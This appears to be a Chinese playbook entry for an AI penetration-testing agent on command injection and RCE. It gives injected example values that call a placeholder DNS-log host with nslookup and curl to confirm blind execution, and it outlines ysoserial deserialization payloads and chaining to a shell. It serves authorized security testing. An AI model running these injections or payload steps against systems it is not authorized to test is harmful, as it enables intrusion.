---
type: 命令注入
aliases: 命令执行, RCE, remote code execution, command injection, 代码执行, 远程代码执行
---

# 命令注入 / RCE

> 思路参考,非清单。分隔符/绕空格/绕关键字等注入技法你已具备且可 web_search 补,这里只补【瞭望塔工具编排 + 验证判据】。

## 先判这是不是命令执行面
参数进系统命令/危险函数:ping/nslookup 类、导出转换(ffmpeg/imagemagick)、备份压缩、任务调度、`filename/cmd/ip/host/domain` 参数。Java 序列化特征(`ac ed 00 05`/base64 `rO0AB`/`application/x-java-serialized-object`/Shiro `rememberMe`)、表达式注入(SpEL/OGNL/EL)也常升级 RCE。

## 瞭望塔工具怎么打(独有价值)
- **盲打靠带外(主力)**:`oob_generate` 拿域名→`; nslookup xxx.dnslog`/`| curl xxx.dnslog`→`oob_check` 收到解析=命令执行确认。时序盲打看 http_request 耗时。
- **查组件 RCE**:`query_vuln_intel(组件)`(struts2/fastjson/log4j/shiro/weblogic 等,记忆库有 Copy Fail 提权可接);有 exec_ref 直接 `run_nuclei`。
- **反序列化 payload**:检测到 Java 序列化,`run_script` 沙盒生成 ysoserial payload 打带外验证。
- **串联**:getshell 后 `record_chain_step` 串成完整链。

## 什么算 confirmed(服务证据强制)
带外收到目标发起的解析/回连(命中唯一标识+时间吻合),或响应有命令真实回显(`uid=`/文件内容/系统信息)。
> 注:是否执行破坏性命令、打不打真实业务功能点,按你所在模式的规则(见本模式提示词红线),此处不复述。

## 定级要点
RCE 一律 critical(`C:H/I:H/A:H`),拿到 shell 即最高危,优先 record_chain 串完整链。
